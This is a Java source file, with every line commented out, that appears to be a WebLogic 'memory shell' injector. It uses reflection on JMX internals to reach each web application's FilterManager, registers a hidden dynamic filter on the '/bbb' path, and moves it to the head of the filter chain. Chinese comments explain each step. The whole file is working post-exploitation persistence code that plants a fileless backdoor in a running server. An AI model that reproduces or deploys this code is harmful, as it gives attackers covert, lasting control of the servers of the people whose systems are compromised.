//package com.memshell.weblogic;
//
//import com.memshell.generic.Util;
//import com.sun.jmx.mbeanserver.NamedObject;
//import com.sun.jmx.mbeanserver.Repository;
//import weblogic.servlet.internal.FilterManager;
//import weblogic.servlet.internal.WebAppServletContext;
//import weblogic.servlet.utils.ServletMapping;
//import weblogic.utils.collections.MatchMap;
//import javax.management.MBeanServer;
//import javax.management.ObjectName;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.lang.management.ManagementFactory;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import java.util.*;
//
//public class FilterBasedWithoutRequest extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        try{
//            String filterName = "dynamicFilter2";
//            String urlPattern = "/bbb";
//
//            MBeanServer server = ManagementFactory.getPlatformMBeanServer();
//            Field field = server.getClass().getDeclaredField("wrappedMBeanServer");
//            field.setAccessible(true);
//            Object obj = field.get(server);
//
//            field = obj.getClass().getDeclaredField("mbsInterceptor");
//            field.setAccessible(true);
//            obj = field.get(obj);
//
//            field = obj.getClass().getDeclaredField("repository");
//            field.setAccessible(true);
//            Repository repository = (Repository)field.get(obj);
//
//            // 这里的 query 参数会被忽略，所以直接用 null
//            Set<NamedObject> namedObjects = repository.query(new ObjectName("com.bea:Type=ApplicationRuntime,*"),null);
//            for(NamedObject namedObject : namedObjects){
//                try{
//                    String name = (String) namedObject.getObject().getAttribute("Name");
//                    if(name.equals("bea_wls_internal") || name.equals("mejb") ||
//                            (name.contains("bea") && name.contains("wls"))) continue;
//
//                    field = namedObject.getObject().getClass().getDeclaredField("managedResource");
//                    field.setAccessible(true);
//                    obj = field.get(namedObject.getObject());
//
//                    field = obj.getClass().getSuperclass().getDeclaredField("children");
//                    field.setAccessible(true);
//                    HashSet set = (HashSet)field.get(obj);
//
//                    for(Object o : set){
//                        if(o.getClass().getName().endsWith("WebAppRuntimeMBeanImpl")){
//                            field = o.getClass().getDeclaredField("context");
//                            field.setAccessible(true);
//                            WebAppServletContext servletContext = (WebAppServletContext) field.get(o);
//                            FilterManager filterManager = servletContext.getFilterManager();
//
//                            // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
//                            if (!filterManager.isFilterRegistered(filterName)) {
//                                System.out.println("[+] Add Dynamic Filter");
//
//                                Class clazz = Util.getDynamicServletTemplateClass();
//
//                                //将 Filter 注册进 FilterManager
//                                //参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
//                                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
//                                registerFilterMethod.setAccessible(true);
//                                registerFilterMethod.invoke(filterManager, filterName, "com.memshell.generic.DynamicFilterTemplate", new String[]{urlPattern}, null, null, null);
//
//
//                                //将我们添加的 Filter 移动到 FilterChian 的第一位
//                                Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
//                                filterPatternListField.setAccessible(true);
//                                ArrayList filterPatternList = (ArrayList)filterPatternListField.get(filterManager);
//
//
//                                //不能用 filterName 来判断，因为在 11g 中此值为空，在 12g 中正常
//                                for(int i = 0; i < filterPatternList.size(); i++){
//                                    Object filterPattern = filterPatternList.get(i);
//                                    Field f = filterPattern.getClass().getDeclaredField("map");
//                                    f.setAccessible(true);
//                                    ServletMapping mapping = (ServletMapping) f.get(filterPattern);
//
//                                    f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
//                                    f.setAccessible(true);
//                                    MatchMap matchMap = (MatchMap)f.get(mapping);
//
//                                    Object result = matchMap.match(urlPattern);
//                                    if(result != null && result.toString().contains(urlPattern)){
//                                        Object temp = filterPattern;
//                                        filterPatternList.set(i, filterPatternList.get(0));
//                                        filterPatternList.set(0, temp);
//                                        break;
//                                    }
//                                }
//                            }
//                        }
//                    }
//                }catch(Exception e){
//                    //pass
//                }
//            }
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//    }
//}